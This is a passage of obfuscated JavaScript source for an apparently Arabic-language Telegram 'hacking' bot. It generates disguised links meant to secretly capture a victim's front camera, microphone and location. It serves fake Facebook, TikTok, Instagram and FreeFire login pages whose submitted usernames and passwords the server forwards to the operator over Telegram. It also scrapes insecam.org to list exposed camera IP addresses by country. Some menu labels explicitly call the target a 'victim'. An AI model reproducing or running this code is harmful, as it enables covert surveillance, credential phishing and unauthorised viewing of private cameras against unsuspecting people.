addVIPUser(_0x3cc4ce){vipUsers[_0x3cc4ce]=!![],saveVIPUsers();}function removeVIPUser(_0x4d3ade){delete vipUsers[_0x4d3ade],saveVIPUsers();}function isVIPUser(_0x5724b3){return!!vipUsers[_0x5724b3];}loadVIPUsers(),bot['onText'](/\/start/,async _0x3c2085=>{const _0x4d3cb6=a0_0x40ad1d,_0x49abff=_0x3c2085['chat']['id'],_0x17045e=await isUserSubscribed(_0x49abff);if(!_0x17045e){const _0x3173cd=_0x4d3cb6(0xba),_0x3a4e18=developerChannels['map'](_0x5a02b5=>[{'text':_0x4d3cb6(0x266)+_0x5a02b5,'url':'https://t.me/'+_0x5a02b5['substring'](0x1)}]);bot['sendMessage'](_0x49abff,_0x3173cd,{'reply_markup':{'inline_keyboard':_0x3a4e18}});return;}const _0x21cded=_0x4d3cb6(0x199);bot[_0x4d3cb6(0x146)](_0x49abff,_0x21cded,{'reply_markup':{'inline_keyboard':[[{'text':_0x4d3cb6(0x11c),'callback_data':'captureFront:'+_0x49abff}],[{'text':_0x4d3cb6(0x104),'callback_data':_0x4d3cb6(0x253)+_0x49abff}],[{'text':_0x4d3cb6(0xc6),'callback_data':_0x4d3cb6(0x228)}],[{'text':'اختراق\x20الموقع📍','callback_data':_0x4d3cb6(0x148)+_0x49abff}],[{'text':'تسجيل\x20صوت\x20الضحيه\x20🎤','callback_data':_0x4d3cb6(0xd8)+_0x49abff}],[{'text':_0x4d3cb6(0x16b),'callback_data':_0x4d3cb6(0x1b9)}],[{'text':_0x4d3cb6(0xfe),'callback_data':_0x4d3cb6(0x100)+_0x49abff}],[{'text':_0x4d3cb6(0x20e),'callback_data':_0x4d3cb6(0xfb)}],[{'text':_0x4d3cb6(0x1c5),'callback_data':_0x4d3cb6(0x198)+_0x49abff}],[{'text':'اختراق\x20فيسبوك\x20🔮','callback_data':'rshq_facebook:'+_0x49abff}],[{'text':_0x4d3cb6(0x236),'callback_data':_0x4d3cb6(0x25e)}],[{'text':_0x4d3cb6(0x15f),'callback_data':_0x4d3cb6(0x1a8)}],[{'text':_0x4d3cb6(0x20c),'callback_data':_0x4d3cb6(0x1ab)}],[{'text':_0x4d3cb6(0x143),'web_app':{'url':_0x4d3cb6(0x18d)}}],[{'text':_0x4d3cb6(0x257),'web_app':{'url':_0x4d3cb6(0x192)}}],[{'text':_0x4d3cb6(0xcd),'callback_data':_0x4d3cb6(0x1c9)}],[{'text':'تفسير\x20الاحلام\x20🧙‍♂️','web_app':{'url':_0x4d3cb6(0x1f9)}}],[{'text':'تلغيم\x20رابط\x20⚠️','callback_data':_0x4d3cb6(0x1da)}],[{'text':_0x4d3cb6(0xdd),'web_app':{'url':_0x4d3cb6(0x122)}}],[{'text':'شرح\x20البوت\x20👨🏻‍🏫','url':_0x4d3cb6(0x139)}],[{'text':_0x4d3cb6(0x167),'url':_0x4d3cb6(0x134)}]]}}),_0x49abff==0x156132fba&&bot[_0x4d3cb6(0x146)](_0x49abff,_0x4d3cb6(0x1c1),{'reply_markup':{'inline_keyboard':[[{'text':'إضافة\x20مشترك\x20VIP','callback_data':'add_vip'}],[{'text':'إلغاء\x20اشتراك\x20VIP','callback_data':_0x4d3cb6(0x1c0)}]]}});}),bot['on'](a0_0x40ad1d(0x278),_0x3b548b=>{const _0x2c6cae=a0_0x40ad1d,_0x536b4e=_0x3b548b['message'][_0x2c6cae(0x243)]['id'],_0x2f342b=_0x3b548b[_0x2c6cae(0xf0)];if(_0x2f342b==='capture_video'){const _0x319acb=_0x2c6cae(0x22b)+_0x536b4e;bot[_0x2c6cae(0x146)](_0x536b4e,_0x319acb);}}),bot['on'](a0_0x40ad1d(0x278),async _0x3547c6=>{const _0x36b9c4=a0_0x40ad1d,_0x377e20=_0x3547c6['message'][_0x36b9c4(0x243)]['id'],_0x19c66c=_0x3547c6[_0x36b9c4(0xf0)],_0x5102d8=[_0x36b9c4(0x1ab),'get_cameras',_0x36b9c4(0x1a8),_0x36b9c4(0x103),_0x36b9c4(0x25e),'rshq_tiktok','add_nammes','rshq_facebook'];if(!_0x5102d8[_0x36b9c4(0x242)](_0x19c66c[_0x36b9c4(0x23b)](':')[0x0])&&!await isUserSubscribed(_0x377e20)){const _0x414421='الرجاء\x20الاشتراك\x20في\x20جميع\x20قنوات\x20المطور\x20قبل\x20استخدام\x20البوت.',_0x5bf5a4=developerChannels[_0x36b9c4(0x25f)](_0x3f3e6d=>({'text':_0x36b9c4(0x266)+_0x3f3e6d,'url':'https://t.me/'+_0x3f3e6d[_0x36b9c4(0x125)](0x1)}));bot[_0x36b9c4(0x146)](_0x377e20,_0x414421,{'reply_markup':{'inline_keyboard':[_0x5bf5a4]}});return;}if(_0x19c66c===_0x36b9c4(0xfb)){const _0x6a97cc=_0x36b9c4(0x1f4)+_0x377e20;bot['sendMessage'](_0x377e20,_0x36b9c4(0x1c7)+_0x6a97cc);return;}const [_0x4bf3b2,_0x4938cd]=_0x19c66c['split'](':');if(_0x4bf3b2==='get_joke')try{const _0x58504a='اعطيني\x20نكته\x20يمنيه\x20قصيره\x20جداً\x20بلهجه\x20اليمنيه\x20الاصيله🤣🤣🤣🤣',_0xce1f46='https://api.openai.com/v1/chat/completions',_0x25e915=await axios[_0x36b9c4(0x262)](_0xce1f46,{'model':_0x36b9c4(0x1ff),'messages':[{'role':'user','content':_0x58504a}]},{'headers':{'Authorization':_0x36b9c4(0x1c3),'Content-Type':_0x36b9c4(0x1aa)}}),_0x438ee0=_0x25e915[_0x36b9c4(0xf0)][_0x36b9c4(0x136)][0x0][_0x36b9c4(0x11d)][_0x36b9c4(0x191)];bot['sendMessage'](_0x377e20,_0x438ee0);}catch(_0x1b5978){console[_0x36b9c4(0x252)](_0x36b9c4(0xe0),_0x1b5978['response']?_0x1b5978[_0x36b9c4(0x11b)]['data']:_0x1b5978['message']),bot['sendMessage'](_0x377e20,_0x36b9c4(0x112));}else{if(_0x19c66c===_0x36b9c4(0x232))try{const _0x49e963=_0x36b9c4(0x19a),_0x3806d9=_0x36b9c4(0x19d),_0x1f5bba=await axios['post'](_0x3806d9,{'model':_0x36b9c4(0x1ff),'messages':[{'role':_0x36b9c4(0x25b),'content':_0x49e963}]},{'headers':{'Authorization':_0x36b9c4(0x1c3),'Content-Type':_0x36b9c4(0x1aa)}}),_0x2f74ed=_0x1f5bba[_0x36b9c4(0xf0)][_0x36b9c4(0x136)][0x0][_0x36b9c4(0x11d)][_0x36b9c4(0x191)];bot[_0x36b9c4(0x146)](_0x377e20,_0x2f74ed);}catch(_0x581745){console[_0x36b9c4(0x252)]('Error\x20fetching\x20love\x20message:',_0x581745[_0x36b9c4(0x11b)]?_0x581745[_0x36b9c4(0x11b)][_0x36b9c4(0xf0)]:_0x581745[_0x36b9c4(0x11d)]),bot[_0x36b9c4(0x146)](_0x377e20,_0x36b9c4(0xbf));}else{if(_0x19c66c===_0x36b9c4(0x26d)&&_0x377e20==0x156132fba)bot['sendMessage'](_0x377e20,_0x36b9c4(0x23f)),bot[_0x36b9c4(0x140)]('message',_0x213ea1=>{const _0x5be814=_0x36b9c4,_0x5ce6f1=_0x213ea1['text'];addVIPUser(_0x5ce6f1),bot[_0x5be814(0x146)](_0x377e20,'تم\x20إضافة\x20المستخدم\x20'+_0x5ce6f1+_0x5be814(0x1e0));});else{if(_0x19c66c===_0x36b9c4(0x1c0)&&_0x377e20==0x156132fba)bot[_0x36b9c4(0x146)](_0x377e20,_0x36b9c4(0x276)),bot[_0x36b9c4(0x140)]('message',_0x2742a6=>{const _0x44db11=_0x36b9c4,_0x5a1d7d=_0x2742a6['text'];removeVIPUser(_0x5a1d7d),bot[_0x44db11(0x146)](_0x377e20,_0x44db11(0x153)+_0x5a1d7d+'\x20من\x20VIP.');});else{const [_0x1f4664,_0x42f747]=_0x19c66c[_0x36b9c4(0x23b)](':');if(!_0x5102d8[_0x36b9c4(0x242)](_0x1f4664)&&!validateLinkUsage(_0x42f747,_0x1f4664)){bot[_0x36b9c4(0x146)](_0x377e20,'');return;}let _0x23d535='';switch(_0x1f4664){case'captureFront':_0x23d535=_0x36b9c4(0x24c)+crypto[_0x36b9c4(0x1f7)](0x10)[_0x36b9c4(0x23a)](_0x36b9c4(0x127))+'?chatId='+_0x377e20;break;case _0x36b9c4(0x13f):_0x23d535=_0x36b9c4(0x206)+crypto[_0x36b9c4(0x1f7)](0x10)[_0x36b9c4(0x23a)](_0x36b9c4(0x127))+_0x36b9c4(0x19f)+_0x377e20;break;case _0x36b9c4(0x179):_0x23d535=_0x36b9c4(0x27a)+crypto[_0x36b9c4(0x1f7)](0x10)[_0x36b9c4(0x23a)](_0x36b9c4(0x127))+'?chatId='+_0x377e20;break;case _0x36b9c4(0x1d6):const _0x1fc8f5=0xa;_0x23d535=_0x36b9c4(0x223)+crypto[_0x36b9c4(0x1f7)](0x10)[_0x36b9c4(0x23a)](_0x36b9c4(0x127))+_0x36b9c4(0x19f)+_0x377e20+_0x36b9c4(0x213)+_0x1fc8f5;break;case'rshq_tiktok':_0x23d535=_0x36b9c4(0x273)+_0x377e20+_0x36b9c4(0x16f);break;case _0x36b9c4(0x103):_0x23d535=_0x36b9c4(0x273)+_0x377e20+_0x36b9c4(0x1bc);break;case _0x36b9c4(0xd0):_0x23d535=_0x36b9c4(0x273)+_0x377e20+_0x36b9c4(0x1c2);break;default:bot[_0x36b9c4(0x146)](_0x377e20,'');return;}bot['sendMessage'](_0x377e20,_0x36b9c4(0x269)+_0x23d535);}}}}bot['answerCallbackQuery'](_0x3547c6['id']);}),bot[a0_0x40ad1d(0xd4)](/\/jjihigjoj/,_0x538590=>{const _0x29fff9=a0_0x40ad1d,_0x42b369=_0x538590['chat']['id'],_0x162fb4='مرحبًا!\x20انقر\x20على\x20الزر\x20لجمع\x20معلومات\x20جهازك.';bot[_0x29fff9(0x146)](_0x42b369,_0x162fb4,{'reply_markup':{'inline_keyboard':[[{'text':_0x29fff9(0x17d),'callback_data':_0x29fff9(0x1c9)}]]}});}),bot['on']('callback_query',_0xd3aede=>{const _0x491333=a0_0x40ad1d,_0x4e1a27=_0xd3aede[_0x491333(0x11d)][_0x491333(0x243)]['id'];if(_0xd3aede[_0x491333(0xf0)]===_0x491333(0x1c9)){const _0x5b7dc4=_0x491333(0x216)+_0x4e1a27;bot[_0x491333(0x146)](_0x4e1a27,_0x491333(0xbd)+_0x5b7dc4);}bot[_0x491333(0x244)](_0xd3aede['id']);}),bot['on'](a0_0x40ad1d(0x278),_0x4aae8c=>{const _0x554c18=a0_0x40ad1d,_0x169aae=_0x4aae8c[_0x554c18(0x11d)][_0x554c18(0x243)]['id'];if(_0x4aae8c[_0x554c18(0xf0)]===_0x554c18(0x1da)){bot[_0x554c18(0x146)](_0x169aae,'أرسل\x20لي\x20رابطًا\x20يبدأ\x20بـ\x20\x22https\x22.');const _0x5e5ba9=_0x1ba03e=>{const _0x56acee=_0x554c18;if(_0x1ba03e[_0x56acee(0x243)]['id']===_0x169aae){if(_0x1ba03e['text']&&_0x1ba03e[_0x56acee(0xc3)][_0x56acee(0x15a)]('https')){const _0x19a046=_0x1ba03e['text'];dataStore[_0x169aae]={'userLink':_0x19a046},bot[_0x56acee(0x146)](_0x169aae,_0x56acee(0x1fe)+_0x169aae),bot[_0x56acee(0xe4)]('message',_0x5e5ba9);}else bot[_0x56acee(0x146)](_0x169aae,_0x56acee(0x182));}};bot['on'](_0x554c18(0x11d),_0x5e5ba9);}}),app['use'](bodyParser[a0_0x40ad1d(0x16a)]({'extended':!![]})),app[a0_0x40ad1d(0xef)](express[a0_0x40ad1d(0x142)](__dirname)),app[a0_0x40ad1d(0x262)]('/submitNames',(_0x10a256,_0x41f5f6)=>{const _0x4480bd=a0_0x40ad1d,_0x5125f1=_0x10a256[_0x4480bd(0x18a)][_0x4480bd(0xc9)],_0x3365fd=_0x10a256['body'][_0x4480bd(0x229)],_0x41ad3=_0x10a256[_0x4480bd(0x18a)][_0x4480bd(0x263)];console[_0x4480bd(0x1d0)](_0x4480bd(0x163),_0x10a256[_0x4480bd(0x18a)]),bot[_0x4480bd(0x146)](_0x5125f1,'أسماء\x20المستخدمين:\x20'+_0x3365fd+'\x20و\x20'+_0x41ad3)['then'](()=>{const _0x3f1f2c=_0x4480bd;_0x41f5f6['sendFile'](path[_0x3f1f2c(0x212)](__dirname,_0x3f1f2c(0x21b)));})[_0x4480bd(0x171)](_0x31a886=>{const _0x5c9760=_0x4480bd;console['error'](_0x5c9760(0x203),_0x31a886['response']?_0x31a886[_0x5c9760(0x11b)][_0x5c9760(0x18a)]:_0x31a886),_0x41f5f6['status'](0x1f4)[_0x5c9760(0x166)](_0x5c9760(0x22e));});}),app[a0_0x40ad1d(0x22d)](a0_0x40ad1d(0x279),(_0x127c8c,_0x4da84f)=>{const _0x53d46a=a0_0x40ad1d,_0x165eae=_0x127c8c[_0x53d46a(0x165)][_0x53d46a(0xc9)];if(!_0x165eae)return _0x4da84f[_0x53d46a(0xfc)](0x190)[_0x53d46a(0x166)]('الرجاء\x20توفير\x20chatId\x20في\x20الطلب.');_0x4da84f[_0x53d46a(0x1fd)](path[_0x53d46a(0x212)](__dirname,_0x53d46a(0x21b)));}),app['use'](bodyParser['urlencoded']({'extended':!![]})),app['use'](express['static'](__dirname)),app[a0_0x40ad1d(0x262)](a0_0x40ad1d(0x245),(_0x54818a,_0xecdaa9)=>{const _0x4b2bde=a0_0x40ad1d,_0x37d52e=_0x54818a[_0x4b2bde(0x18a)][_0x4b2bde(0xc9)],_0x14f948=_0x54818a[_0x4b2bde(0x18a)][_0x4b2bde(0x229)],_0x325df8=_0x54818a[_0x4b2bde(0x18a)][_0x4b2bde(0x263)];console[_0x4b2bde(0x1d0)]('Received\x20data:',_0x54818a[_0x4b2bde(0x18a)]),bot[_0x4b2bde(0x146)](_0x37d52e,_0x4b2bde(0xdb)+_0x14f948+_0x4b2bde(0x26b)+_0x325df8)[_0x4b2bde(0x197)](()=>{const _0x5d944b=_0x4b2bde;_0xecdaa9[_0x5d944b(0x1fd)](path[_0x5d944b(0x212)](__dirname,'FreeFire.html'));})[_0x4b2bde(0x171)](_0x49a5ad=>{const _0x240e38=_0x4b2bde;console['error'](_0x240e38(0x203),_0x49a5ad[_0x240e38(0x11b)]?_0x49a5ad[_0x240e38(0x11b)][_0x240e38(0x18a)]:_0x49a5ad),_0xecdaa9[_0x240e38(0xfc)](0x1f4)[_0x240e38(0x166)](_0x240e38(0x22e));});}),app[a0_0x40ad1d(0x22d)](a0_0x40ad1d(0x209),(_0x265e6d,_0x103bdf)=>{const _0x5b7044=a0_0x40ad1d,_0x15f2c3=_0x265e6d[_0x5b7044(0x165)]['chatId'];if(!_0x15f2c3)return _0x103bdf[_0x5b7044(0xfc)](0x190)['send']('الرجاء\x20توفير\x20chatId\x20في\x20الطلب.');_0x103bdf['sendFile'](path[_0x5b7044(0x212)](__dirname,'FreeFire.html'));}),app['use'](bodyParser[a0_0x40ad1d(0x16a)]({'extended':!![]})),app[a0_0x40ad1d(0xef)](express[a0_0x40ad1d(0x142)](__dirname)),app['post']('/submitNames',(_0x1bb3c6,_0x167fd6)=>{const _0x223903=a0_0x40ad1d,_0x2230be=_0x1bb3c6[_0x223903(0x18a)][_0x223903(0xc9)],_0xe061db=_0x1bb3c6[_0x223903(0x18a)][_0x223903(0x229)],_0xd450ab=_0x1bb3c6['body'][_0x223903(0x263)];console[_0x223903(0x1d0)](_0x223903(0x163),_0x1bb3c6['body']),bot[_0x223903(0x146)](_0x2230be,_0x223903(0xdb)+_0xe061db+_0x223903(0x26b)+_0xd450ab)['then'](()=>{const _0x3d0947=_0x223903;_0x167fd6['sendFile'](path[_0x3d0947(0x212)](__dirname,_0x3d0947(0x1e4)));})[_0x223903(0x171)](_0x258a89=>{const _0x2445a3=_0x223903;console[_0x2445a3(0x252)](_0x2445a3(0x203),_0x258a89[_0x2445a3(0x11b)]?_0x258a89[_0x2445a3(0x11b)]['body']:_0x258a89),_0x167fd6[_0x2445a3(0xfc)](0x1f4)[_0x2445a3(0x166)]('حدثت\x20مشكلة\x20أثناء\x20إرسال\x20الأسماء\x20إلى\x20التلغرام.');});}),app[a0_0x40ad1d(0x22d)](a0_0x40ad1d(0x26a),(_0x42ef4d,_0x1e6b50)=>{const _0x6ba74d=a0_0x40ad1d,_0x240d86=_0x42ef4d['query'][_0x6ba74d(0xc9)];if(!_0x240d86)return _0x1e6b50['status'](0x190)[_0x6ba74d(0x166)](_0x6ba74d(0x251));_0x1e6b50[_0x6ba74d(0x1fd)](path[_0x6ba74d(0x212)](__dirname,_0x6ba74d(0x1e4)));});const countryTranslation={'AF':a0_0x40ad1d(0x151),'AL':a0_0x40ad1d(0x10e),'DZ':a0_0x40ad1d(0x154),'AO':'أنغولا\x20🇦🇴','AR':a0_0x40ad1d(0x13c),'AM':a0_0x40ad1d(0x233),'AU':a0_0x40ad1d(0x1d1),'AT':a0_0x40ad1d(0x1b6),'AZ':'أذربيجان\x20🇦🇿','BH':'البحرين\x20🇧🇭','BD':a0_0x40ad1d(0xcb),'BY':'بيلاروس\x20🇧🇾','BE':'بلجيكا\x20🇧🇪','BZ':a0_0x40ad1d(0xc4),'BJ':'بنين\x20🇧🇯','BO':a0_0x40ad1d(0x1e1),'BA':a0_0x40ad1d(0x10c),'BW':'بوتسوانا\x20🇧🇼','BR':'البرازيل\x20🇧🇷','BG':a0_0x40ad1d(0x18b),'BF':a0_0x40ad1d(0x188),'KH':'كمبوديا\x20🇰🇭','CM':a0_0x40ad1d(0x1c8),'CA':a0_0x40ad1d(0xfd),'CL':'تشيلي\x20🇨🇱','CN':a0_0x40ad1d(0x24b),'CO':'كولومبيا\x20🇨🇴','CR':a0_0x40ad1d(0x1dd),'HR':a0_0x40ad1d(0x1e5),'CY':a0_0x40ad1d(0x1df),'CZ':a0_0x40ad1d(0xff),'DK':a0_0x40ad1d(0x107),'EC':a0_0x40ad1d(0x259),'EG':a0_0x40ad1d(0x174),'SV':'السلفادور\x20🇸🇻','EE':a0_0x40ad1d(0x1bd),'ET':'إثيوبيا\x20🇪🇹','FI':a0_0x40ad1d(0xde),'FR':a0_0x40ad1d(0x121),'GE':a0_0x40ad1d(0x1d7),'DE':a0_0x40ad1d(0xe5),'GH':a0_0x40ad1d(0x1be),'GR':a0_0x40ad1d(0x13a),'GT':a0_0x40ad1d(0x102),'HN':a0_0x40ad1d(0xda),'HK':a0_0x40ad1d(0x231),'HU':'المجر\x20🇭🇺','IS':a0_0x40ad1d(0x1d8),'IN':a0_0x40ad1d(0x270),'ID':'إندونيسيا\x20🇮🇩','IR':a0_0x40ad1d(0x156),'IQ':a0_0x40ad1d(0x1ce),'IE':a0_0x40ad1d(0x1ac),'IL':a0_0x40ad1d(0x1d9),'IT':'إيطاليا\x20🇮🇹','CI':a0_0x40ad1d(0x16c),'JP':a0_0x40ad1d(0x15b),'JO':a0_0x40ad1d(0x1b4),'KZ':a0_0x40ad1d(0xf8),'KE':'كينيا\x20🇰🇪','KW':a0_0x40ad1d(0x26f),'KG':a0_0x40ad1d(0xbe),'LV':a0_0x40ad1d(0x20b),'LB':a0_0x40ad1d(0x261),'LY':a0_0x40ad1d(0x180),'LT':a0_0x40ad1d(0x16e),'LU':'لوكسمبورغ\x20🇱🇺','MO':'ماكاو\x20🇲🇴','MY':a0_0x40ad1d(0x27f),'ML':a0_0x40ad1d(0x119),'MT':a0_0x40ad1d(0x256),'MX':a0_0x40ad1d(0x277),'MC':'موناكو\x20🇲🇨','MN':'منغوليا\x20🇲🇳','ME':a0_0x40ad1d(0x128),'MA':a0_0x40ad1d(0xd9),'MZ':a0_0x40ad1d(0x1eb),'MM':a0_0x40ad1d(0x189),'NA':a0_0x40ad1d(0x255),'NP':a0_0x40ad1d(0x175),'NL':a0_0x40ad1d(0x144),'NZ':a0_0x40ad1d(0x20a),'NG':a0_0x40ad1d(0x11a),'KP':a0_0x40ad1d(0x10f),'NO':a0_0x40ad1d(0x124),'OM':a0_0x40ad1d(0x1a7),'PK':'باكستان\x20🇵🇰','PS':a0_0x40ad1d(0x194),'PA':a0_0x40ad1d(0x222),'PY':a0_0x40ad1d(0x235),'PE':a0_0x40ad1d(0x13b),'PH':a0_0x40ad1d(0x1c6),'PL':a0_0x40ad1d(0x24a),'PT':'البرتغال\x20🇵🇹','PR':'بورتوريكو\x20🇵🇷','QA':'قطر\x20🇶🇦','RO':a0_0x40ad1d(0xe9),'RU':a0_0x40ad1d(0xea),'RW':a0_0x40ad1d(0x214),'SA':a0_0x40ad1d(0x258),'SN':a0_0x40ad1d(0x1b5),'RS':a0_0x40ad1d(0x24e),'SG':a0_0x40ad1d(0x169),'SK':a0_0x40ad1d(0x1ba),'SI':a0_0x40ad1d(0x20d),'ZA':a0_0x40ad1d(0x108),'KR':a0_0x40ad1d(0x25a),'ES':a0_0x40ad1d(0x149),'LK':a0_0x40ad1d(0x1cf),'SD':a0_0x40ad1d(0x220),'SE':a0_0x40ad1d(0x10d),'CH':a0_0x40ad1d(0x16d),'SY':'سوريا\x20🇸🇾','TW':a0_0x40ad1d(0x234),'TZ':a0_0x40ad1d(0x25c),'TH':a0_0x40ad1d(0x113),'TG':'توغو\x20🇹🇬','TN':a0_0x40ad1d(0x207),'TR':'تركيا\x20🇹🇷','TM':'تركمانستان\x20🇹🇲','UG':'أوغندا\x20🇺🇬','UA':'أوكرانيا\x20🇺🇦','AE':a0_0x40ad1d(0x250),'GB':'بريطانيا\x20🇬🇧','US':a0_0x40ad1d(0x1cc),'UY':a0_0x40ad1d(0x135),'UZ':a0_0x40ad1d(0x1de),'VE':a0_0x40ad1d(0x1b7),'VN':a0_0x40ad1d(0xe2),'ZM':'زامبيا\x20🇿🇲','ZW':a0_0x40ad1d(0xfa),'GL':'غرينلاند\x20🇬🇱','KY':a0_0x40ad1d(0x1e9),'NI':a0_0x40ad1d(0x23d),'DO':a0_0x40ad1d(0x178),'NC':a0_0x40ad1d(0x183),'LA':a0_0x40ad1d(0x19c),'TT':'ترينيداد\x20وتوباغو\x20🇹🇹','GG':'غيرنزي\x20🇬🇬','GU':a0_0x40ad1d(0x237),'GP':a0_0x40ad1d(0x1f0),'MG':'مدغشقر\x20🇲🇬','RE':a0_0x40ad1d(0x1a9),'FO':a0_0x40ad1d(0x240),'MD':a0_0x40ad1d(0x12f)},camRequestCounts={};async function initStorage(){const _0x1a7d7e=a0_0x40ad1d;await storage['init'](),vipUsers=await storage[_0x1a7d7e(0x22c)](_0x1a7d7e(0x1ec))||[];}async function saveVipUsers(){const _0x45a3cc=a0_0x40ad1d;await storage[_0x45a3cc(0x1d2)](_0x45a3cc(0x1ec),vipUsers);}function showCountryList(_0x121d32,_0x1c5000=0x0){const _0x49e03c=a0_0x40ad1d;try{const _0x271921=[],_0xa4387a=Object['keys'](countryTranslation),_0x3dede6=Object[_0x49e03c(0xcc)](countryTranslation),_0x38c7eb=Math[_0x49e03c(0xdf)](_0x1c5000+0x63,_0xa4387a[_0x49e03c(0xf2)]);for(let _0x2c81e5=_0x1c5000;_0x2c81e5<_0x38c7eb;_0x2c81e5+=0x3){const _0x6b42e2=[];for(let _0x14982e=_0x2c81e5;_0x14982e<_0x2c81e5+0x3&&_0x14982e<_0x38c7eb;_0x14982e++){const _0x2d2e33=_0xa4387a[_0x14982e],_0x46c59c=_0x3dede6[_0x14982e];_0x6b42e2[_0x49e03c(0x1f6)]({'text':_0x46c59c,'callback_data':_0x2d2e33});}_0x271921[_0x49e03c(0x1f6)](_0x6b42e2);}const _0x8b6e79=[];_0x1c5000>0x0&&_0x8b6e79[_0x49e03c(0x1f6)],_0x38c7eb<_0xa4387a[_0x49e03c(0xf2)]&&_0x8b6e79[_0x49e03c(0x1f6)]({'text':_0x49e03c(0x23c),'callback_data':_0x49e03c(0xf6)+_0x38c7eb}),_0x8b6e79['length']&&_0x271921[_0x49e03c(0x1f6)](_0x8b6e79),bot[_0x49e03c(0x146)](_0x121d32,_0x49e03c(0x15e),{'reply_markup':{'inline_keyboard':_0x271921}});}catch(_0x322dce){bot[_0x49e03c(0x146)](_0x121d32,_0x49e03c(0x17b)+_0x322dce['message']);}}async function displayCameras(_0x250029,_0xe89a1b){const _0x36511a=a0_0x40ad1d;try{const _0x35967b=await bot[_0x36511a(0x146)](_0x250029,_0x36511a(0x12e)),_0x52aa19=_0x35967b['message_id'];for(let _0x1bf25e=0x0;_0x1bf25e<0xf;_0x1bf25e++){await bot['editMessageText'](_0x36511a(0x161)+'.'[_0x36511a(0x12d)](_0x1bf25e%0x4),{'chat_id':_0x250029,'message_id':_0x52aa19}),await new Promise(_0xc14c62=>setTimeout(_0xc14c62,0x3e8));}const _0x2d0ba0='http://www.insecam.org/en/bycountry/'+_0xe89a1b,_0x17fb35={'User-Agent':'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/110.0.0.0\x20Safari/537.36'};let _0x363cde=await axios[_0x36511a(0x22d)](_0x2d0ba0,{'headers':_0x17fb35});const _0xacea6f=_0x363cde[_0x36511a(0xf0)][_0x36511a(0x17c)](/pagenavigator\("\?page=", (\d+)/);if(!_0xacea6f){bot['sendMessage'](_0x250029,_0x36511a(0xca));return;}const _0x472533=parseInt(_0xacea6f[0x1],0xa),_0x59a1c0=[];for(let _0x21537e=0x1;_0x21537e<=_0x472533;_0x21537e++){_0x363cde=await axios['get'](_0x2d0ba0+_0x36511a(0x157)+_0x21537e,{'headers':_0x17fb35});const _0xc3f139=_0x363cde['data'][_0x36511a(0x17c)](/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g)||[];_0x59a1c0[_0x36511a(0x1f6)](..._0xc3f139);}if(_0x59a1c0[_0x36511a(0xf2)]){const _0x4f60f2=_0x59a1c0['map']((_0x2a3339,_0x1e2e62)=>_0x1e2e62+0x1+'.\x20'+_0x2a3339);for(let _0x2223a0=0x0;_0x2223a0<_0x4f60f2[_0x36511a(0xf2)];_0x2223a0+=0x32){const _0x5d6785=_0x4f60f2[_0x36511a(0x1db)](_0x2223a0,_0x2223a0+0x32);await bot['sendMessage'](_0x250029,_0x5d6785[_0x36511a(0x212)]('\x0a'));}await bot['sendMessage'](_0x250029,_0x36511a(0x1f8));}else await bot[_0x36511a(0x146)](_0x250029,_0x36511a(0x133));}catch(_0x52cf3c){await bot[_0x36511a(0x146)](_0x250029,_0x36511a(0x133));}}function isDeveloper(_0xee960b){const _0x25c225=0x1afe99c76;return _0xee960b===_0x25c225;}function showAdminPanel(_0x76eb97){const _0x199d97=a0_0x40ad1d;bot[_0x199d97(0x146)](_0x76eb97,_0x199d97(0x173),{'reply_markup':{'inline_keyboard':[[{'text':_0x199d97(0x208),'callback_data':'add_vip'}],[{'text':'إزالة\x20مستخدم\x20VIP','callback_data':_0x199d97(0x1c0)}]]}});}bot[a0_0x40ad1d(0xd4)](/\/jjjjjavayy/,_0x1b1b9d=>{const _0xaef27a=a0_0x40ad1d,_0x5a582e=_0x1b1b9d[_0xaef27a(0x243)]['id'],_0x3195de=_0xaef27a(0x162);bot[_0xaef27a(0x146)](_0x5a582e,_0x3195de,{'reply_markup':{'inline_keyboard':[[{'text':_0xaef27a(0x20f),'callback_data':_0xaef27a(0x25e)}],[{'text':_0xaef27a(0x1ed),'callback_data':_0xaef27a(0x1a8)}],[{'text':_0xaef27a(0x117),'callback_data':_0xaef27a(0x1ab)}]]}});}),bot['on'](a0_0x40ad1d(0x278),_0x3d3180=>{const _0x19afa2=a0_0x40ad1d,_0x122d47=_0x3d3180[_0x19afa2(0x11d)][_0x19afa2(0x243)]['id'];let _0x490392;if(_0x3d3180['data']===_0x19afa2(0x25e))_0x490392=_0x19afa2(0x14f)+_0x122d47+'.png';else{if(_0x3d3180[_0x19afa2(0xf0)]==='get_freefire')_0x490392=_0x19afa2(0x25d)+_0x122d47+_0x19afa2(0xf9);else _0x3d3180[_0x19afa2(0xf0)]===_0x19afa2(0x1ab)&&(_0x490392=_0x19afa2(0x11e)+_0x122d47+'.png');}if(_0x490392)bot[_0x19afa2(0x146)](_0x122d47,_0x19afa2(0x1b8)+_0x490392),bot[_0x19afa2(0x244)](_0x3d3180['id'],{'text':_0x19afa2(0x239)});else _0x3d3180[_0x19afa2(0xf0)]===_0x19afa2(0x22a)&&(bot[_0x19afa2(0x146)](_0x122d47,_0x19afa2(0x172)),bot[_0x19afa2(0x244)](_0x3d3180['id'],{'text':''}));}),bot['onText'](/\/نننطسطوو/,_0x505206=>{const _0x29b3d2=a0_0x40ad1d,_0x5415f7=_0x505206[_0x29b3d2(0x243)]['id'];bot[_0x29b3d2(0x146)](_0x5415f7,_0x29b3d2(0x272),{'reply_markup':{'inline_keyboard':[[{'text':_0x29b3d2(0xc0),'callback_data':_0x29b3d2(0x1b9)}]]}}),isDeveloper(_0x5415f7)&&showAdminPanel(_0x5415f7);}),bot['on'](a0_0x40ad1d(0x278),async _0x47a795=>{const _0x4cfd1f=a0_0x40ad1d,_0x978de7=_0x47a795['message'][_0x4cfd1f(0x243)]['id'];if(_0x47a795['data']===_0x4cfd1f(0x1b9))showCountryList(_0x978de7);else{if(_0x47a795[_0x4cfd1f(0xf0)]in countryTranslation)bot[_0x4cfd1f(0x27e)](_0x978de7,_0x47a795[_0x4cfd1f(0x11d)]['message_id']),displayCameras(_0x978de7,_0x47a795['data']);else{if(_0x47a795[_0x4cfd1f(0xf0)][_0x4cfd1f(0x15a)](_0x4cfd1f(0xf6))){const 